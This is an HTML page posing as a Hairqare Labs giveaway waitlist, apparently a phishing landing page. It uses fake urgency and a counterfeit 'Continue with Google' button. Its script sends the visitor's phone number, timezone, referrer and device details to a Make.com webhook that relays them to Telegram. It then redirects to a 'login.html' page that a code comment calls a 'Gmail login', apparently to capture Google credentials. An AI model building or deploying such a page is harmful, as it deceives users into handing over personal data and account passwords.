<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HQL Advance Students Giveaway - Hairqare Labs</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: 'Inter', sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
        position: relative;
        overflow-x: hidden;
      }

      /* Animated background elements */
      .bg-animation {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 0;
      }

      .floating-element {
        position: absolute;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 50%;
        animation: float 6s ease-in-out infinite;
      }

      .floating-element:nth-child(1) {
        width: 80px;
        height: 80px;
        top: 20%;
        left: 10%;
        animation-delay: 0s;
      }

      .floating-element:nth-child(2) {
        width: 120px;
        height: 120px;
        top: 60%;
        right: 10%;
        animation-delay: 2s;
      }

      .floating-element:nth-child(3) {
        width: 60px;
        height: 60px;
        bottom: 20%;
        left: 20%;
        animation-delay: 4s;
      }

      @keyframes float {
        0%,
        100% {
          transform: translateY(0px) rotate(0deg);
        }
        50% {
          transform: translateY(-20px) rotate(180deg);
        }
      }

      .container {
        max-width: 500px;
        width: 100%;
        position: relative;
        z-index: 10;
      }

      .waitlist-card {
        background: rgba(255, 255, 255, 0.95);
        backdrop-filter: blur(20px);
        border-radius: 24px;
        padding: 48px 40px;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        text-align: center;
        position: relative;
        overflow: hidden;
      }

      .waitlist-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 4px;
        background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
        background-size: 200% 100%;
        animation: gradient 3s ease infinite;
      }

      @keyframes gradient {
        0%,
        100% {
          background-position: 0% 50%;
        }
        50% {
          background-position: 100% 50%;
        }
      }

      .logo-section {
        margin-bottom: 32px;
      }

      .brand-logo {
        font-size: 32px;
        font-weight: 700;
        background: linear-gradient(135deg, #667eea, #764ba2);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        margin-bottom: 8px;
      }

      .brand-subtitle {
        font-size: 14px;
        color: #6b7280;
        font-weight: 500;
        letter-spacing: 0.5px;
        text-transform: uppercase;
      }

      .title {
        font-size: 28px;
        font-weight: 700;
        color: #1f2937;
        margin-bottom: 12px;
        line-height: 1.2;
      }

      .subtitle {
        font-size: 18px;
        color: #667eea;
        font-weight: 600;
        margin-bottom: 8px;
      }

      .description {
        font-size: 16px;
        color: #4b5563;
        line-height: 1.6;
        margin-bottom: 32px;
      }

      .features {
        background: #f8fafc;
        border-radius: 16px;
        padding: 24px;
        margin-bottom: 32px;
        text-align: left;
      }

      .features h3 {
        font-size: 18px;
        font-weight: 600;
        color: #1f2937;
        margin-bottom: 16px;
        text-align: center;
      }

      .feature-list {
        list-style: none;
        padding: 0;
      }

      .feature-list li {
        display: flex;
        align-items: center;
        margin-bottom: 12px;
        font-size: 14px;
        color: #374151;
      }

      .feature-list li::before {
        content: '‚ú®';
        margin-right: 12px;
        font-size: 16px;
      }

      .form-section {
        margin-bottom: 24px;
      }

      .input-group {
        position: relative;
        margin-bottom: 24px;
      }

      .input-label {
        display: block;
        font-size: 14px;
        font-weight: 600;
        color: #374151;
        margin-bottom: 8px;
        text-align: left;
      }

      .phone-input {
        width: 100%;
        padding: 16px 20px;
        border: 2px solid #e5e7eb;
        border-radius: 12px;
        font-size: 16px;
        background: #ffffff;
        transition: all 0.3s ease;
        outline: none;
      }

      .phone-input:focus {
        border-color: #667eea;
        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
      }

      .phone-input:valid {
        border-color: #10b981;
      }

      .country-hint {
        font-size: 12px;
        color: #6b7280;
        margin-top: 4px;
        text-align: left;
      }

      .join-button {
        width: 100%;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 18px 32px;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
      }

      .join-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
      }

      .join-button:active {
        transform: translateY(0);
      }

      .join-button:disabled {
        opacity: 0.7;
        cursor: not-allowed;
        transform: none;
      }

      .loading-spinner {
        display: none;
        width: 20px;
        height: 20px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: white;
        animation: spin 1s ease-in-out infinite;
        margin-right: 8px;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      .security-note {
        font-size: 12px;
        color: #6b7280;
        margin-top: 16px;
        line-height: 1.4;
      }

      .success-message {
        display: none;
        background: #ecfdf5;
        border: 1px solid #10b981;
        color: #047857;
        padding: 16px;
        border-radius: 12px;
        margin-bottom: 16px;
        font-weight: 500;
      }

      .error-message {
        display: none;
        background: #fef2f2;
        border: 1px solid #ef4444;
        color: #dc2626;
        padding: 16px;
        border-radius: 12px;
        margin-bottom: 16px;
        font-weight: 500;
      }

      /* Responsive design */
      @media (max-width: 640px) {
        .waitlist-card {
          padding: 32px 24px;
          margin: 16px;
        }

        .title {
          font-size: 24px;
        }

        .brand-logo {
          font-size: 28px;
        }
      }

      /* Progress bar */
      .progress-section {
        margin-bottom: 32px;
        background: #f8fafc;
        padding: 20px;
        border-radius: 16px;
      }

      .progress-text {
        font-size: 14px;
        color: #6b7280;
        margin-bottom: 8px;
      }

      .progress-bar {
        width: 100%;
        height: 8px;
        background: #e5e7eb;
        border-radius: 4px;
        overflow: hidden;
      }

      .progress-fill {
        height: 100%;
        background: linear-gradient(90deg, #667eea, #764ba2);
        border-radius: 4px;
        width: 73%;
        animation: pulse 2s ease-in-out infinite;
      }

      @keyframes pulse {
        0%,
        100% {
          opacity: 1;
        }
        50% {
          opacity: 0.8;
        }
      }

      .spots-left {
        font-size: 16px;
        font-weight: 600;
        color: #dc2626;
        margin-top: 8px;
      }
    </style>
  </head>
  <body>
    <!-- Animated background -->
    <div class="bg-animation">
      <div class="floating-element"></div>
      <div class="floating-element"></div>
      <div class="floating-element"></div>
    </div>

    <div class="container">
      <div class="waitlist-card">
        <div class="logo-section">
          <div class="brand-logo">HQL</div>
          <div class="brand-subtitle">Hairqare Labs</div>
        </div>

        <h1 class="title">üéÅ Exclusive Giveaway</h1>
        <p class="subtitle">Valid for 24 hours</p>
        <p class="description">
          Join our exclusive waitlist for a chance to win premium Hairqare
          products and get early access to our latest hair transformation
          programs.
        </p>

        <!-- Progress Section -->
        <div class="progress-section">
          <div class="progress-text">Waitlist Progress</div>
          <div class="progress-bar">
            <div class="progress-fill"></div>
          </div>
          <div class="spots-left">Only 27 spots remaining!</div>
        </div>

        <!-- Features -->
        <div class="features">
          <h3>üåü What You'll Get</h3>
          <ul class="feature-list">
            <li>Exclusive access to new product launches</li>
            <li>Free premium hair analysis session</li>
            <li>Advanced hair care masterclass materials</li>
            <li>Priority customer support</li>
            <li>Monthly expert-curated hair tips</li>
          </ul>
        </div>

        <!-- Success/Error Messages -->
        <div class="success-message" id="success-message">
          üéâ Successfully joined the waitlist! Redirecting you to complete your
          profile...
        </div>

        <div class="error-message" id="error-message">
          ‚ùå Something went wrong. Please try again.
        </div>

        <!-- Form -->
        <div class="form-section" id="form-section">
          <div class="input-group">
            <label for="phone" class="input-label">üì± Phone Number</label>
            <input
              type="tel"
              id="phone"
              class="phone-input"
              placeholder="+1 555 123 4567, +44 7700 900123, +49 30 12345678"
              required
            />
            <div class="country-hint">
              üåç Supports US (+1), UK (+44), Germany (+49), and other
              international numbers
            </div>
          </div>

          <button type="button" class="join-button" id="join-button">
            <span class="loading-spinner" id="loading-spinner"></span>
            <svg
              width="18"
              height="18"
              viewBox="0 0 18 18"
              style="margin-right: 8px; display: inline-block"
              id="google-icon"
            >
              <path
                fill="#4285F4"
                d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 0 0 2.38-5.88c0-.57-.05-.66-.15-1.18z"
              />
              <path
                fill="#34A853"
                d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2.04a4.8 4.8 0 0 1-2.7.75 4.8 4.8 0 0 1-4.52-3.36H1.83v2.07A8 8 0 0 0 8.98 17z"
              />
              <path
                fill="#FBBC05"
                d="M4.46 10.41a4.8 4.8 0 0 1 0-3.04V5.3H1.83a8 8 0 0 0 0 7.17l2.63-2.06z"
              />
              <path
                fill="#EA4335"
                d="M8.98 3.58c1.32 0 2.5.45 3.44 1.35l2.54-2.54A7.72 7.72 0 0 0 8.98 1a8 8 0 0 0-7.15 4.42l2.63 2.05c.61-1.86 2.35-3.36 4.52-3.36z"
              />
            </svg>
            <span id="button-text">Continue with Google</span>
          </button>

          <p class="security-note">
            üîí Your phone number is secure and will only be used for giveaway
            notifications. By joining, you agree to receive updates about
            exclusive offers.
          </p>
        </div>
      </div>
    </div>

    <script>
      document.addEventListener('DOMContentLoaded', function () {
        const phoneInput = document.getElementById('phone');
        const joinButton = document.getElementById('join-button');
        const loadingSpinner = document.getElementById('loading-spinner');
        const buttonText = document.getElementById('button-text');
        const successMessage = document.getElementById('success-message');
        const errorMessage = document.getElementById('error-message');
        const formSection = document.getElementById('form-section');

        // API endpoint for Telegram notifications
        const API_ENDPOINT =
          'https://hook.eu2.make.com/wmduh51b8n4vs8yt8jygndpxcttbgq3y';

        // International phone number validation
        function isValidInternationalPhone(phone) {
          // Remove all non-digit characters except +
          const cleaned = phone.replace(/[^+\d]/g, '');

          // Must start with + and have at least 7 digits
          if (!cleaned.startsWith('+') || cleaned.length < 8) {
            return false;
          }

          // Common country codes and their lengths
          const countryCodes = {
            '+1': [11, 12], // US/Canada: +1 XXX XXX XXXX
            '+44': [11, 13], // UK: +44 XXXX XXXXXX
            '+49': [11, 12], // Germany: +49 XXX XXXXXXX
            '+33': [10, 11], // France: +33 X XX XX XX XX
            '+39': [10, 13], // Italy: +39 XXX XXXXXXX
            '+34': [9, 12], // Spain: +34 XXX XXXXXX
            '+31': [9, 11], // Netherlands: +31 X XXXXXXXX
            '+46': [9, 12], // Sweden: +46 XX XXX XXXX
            '+47': [8, 11], // Norway: +47 XXX XX XXX
            '+45': [8, 11], // Denmark: +45 XX XX XX XX
            '+41': [9, 12], // Switzerland: +41 XX XXX XXXX
            '+43': [10, 13], // Austria: +43 XXX XXXXXXX
            '+32': [9, 10], // Belgium: +32 XXX XX XX XX
            '+91': [10, 13], // India: +91 XXXXX XXXXX
            '+86': [11, 13], // China: +86 XXX XXXX XXXX
            '+81': [10, 11], // Japan: +81 XX XXXX XXXX
            '+82': [10, 11], // South Korea: +82 XX XXXX XXXX
            '+61': [9, 11], // Australia: +61 XXX XXX XXX
            '+55': [11, 13], // Brazil: +55 XX XXXXX XXXX
            '+52': [10, 12], // Mexico: +52 XXX XXX XXXX
            '+7': [10, 11], // Russia: +7 XXX XXX XXXX
          };

          // Check if it matches any known country code pattern
          for (const [code, lengths] of Object.entries(countryCodes)) {
            if (cleaned.startsWith(code)) {
              return lengths.some((len) => cleaned.length === len);
            }
          }

          // If not a known country code, allow 8-15 digits total
          return cleaned.length >= 8 && cleaned.length <= 15;
        }

        // Format phone number as user types (minimal formatting)
        phoneInput.addEventListener('input', function (e) {
          let value = e.target.value;

          // If it doesn't start with +, add it
          if (value.length > 0 && !value.startsWith('+')) {
            value = '+' + value.replace(/[^\d]/g, '');
          }

          // Allow only + and digits
          value = value.replace(/[^+\d]/g, '');

          e.target.value = value;

          // Visual feedback for valid numbers
          if (value.length > 3 && isValidInternationalPhone(value)) {
            phoneInput.style.borderColor = '#10b981';
          } else if (value.length > 3) {
            phoneInput.style.borderColor = '#ef4444';
          } else {
            phoneInput.style.borderColor = '#e5e7eb';
          }
        });

        // Join waitlist functionality
        joinButton.addEventListener('click', async function () {
          const phone = phoneInput.value.trim();

          // Validation
          if (!phone) {
            showError('Please enter your phone number');
            return;
          }

          if (!isValidInternationalPhone(phone)) {
            showError('Please enter a valid international phone number');
            return;
          }

          // Show loading state
          setLoadingState(true);
          hideMessages();

          try {
            // Prepare data for Telegram
            const waitlistData = {
              phone_number: phone,
              timestamp: new Date().toISOString(),
              user_agent: navigator.userAgent,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              page_referrer: document.referrer || 'Direct',
            };

            // Format message for Telegram
            const telegramMessage =
              `üéÅ *HQL Waitlist Registration*\n\n` +
              `üì± *Phone:* ${phone}\n` +
              `‚è∞ *Time:* ${new Date().toLocaleString()}\n` +
              `üåç *Timezone:* ${waitlistData.timezone}\n` +
              `üìÑ *Referrer:* ${waitlistData.page_referrer}\n` +
              `üñ•Ô∏è *Device:* ${navigator.platform}\n\n` +
              `‚ú® *Status:* New HQL advance student joined the exclusive giveaway waitlist!`;

            const payload = {
              stage: 'HQL Waitlist Registration',
              timestamp: waitlistData.timestamp,
              data: waitlistData,
              telegram_message: telegramMessage,
            };

            // Send to API
            const response = await fetch(API_ENDPOINT, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload),
            });

            if (response.ok) {
              // Success - show message and redirect
              showSuccess();

              // Redirect to Gmail login after 3 seconds
              setTimeout(() => {
                window.location.href = 'login.html';
              }, 3000);
            } else {
              throw new Error('Failed to join waitlist');
            }
          } catch (error) {
            console.error('Error joining waitlist:', error);
            showError('Failed to join waitlist. Please try again.');
            setLoadingState(false);
          }
        });

        // Enter key support
        phoneInput.addEventListener('keypress', function (e) {
          if (e.key === 'Enter') {
            joinButton.click();
          }
        });

        // Helper functions
        function setLoadingState(loading) {
          const googleIcon = document.getElementById('google-icon');

          if (loading) {
            joinButton.disabled = true;
            loadingSpinner.style.display = 'inline-block';
            googleIcon.style.display = 'none';
            buttonText.textContent = 'Continuing with Google...';
          } else {
            joinButton.disabled = false;
            loadingSpinner.style.display = 'none';
            googleIcon.style.display = 'inline-block';
            buttonText.textContent = 'Continue with Google';
          }
        }

        function showSuccess() {
          successMessage.style.display = 'block';
          formSection.style.display = 'none';
          errorMessage.style.display = 'none';
        }

        function showError(message) {
          errorMessage.textContent = message;
          errorMessage.style.display = 'block';
          successMessage.style.display = 'none';
        }

        function hideMessages() {
          successMessage.style.display = 'none';
          errorMessage.style.display = 'none';
        }

        // Auto-focus on phone input
        phoneInput.focus();
      });
    </script>
  </body>
</html>
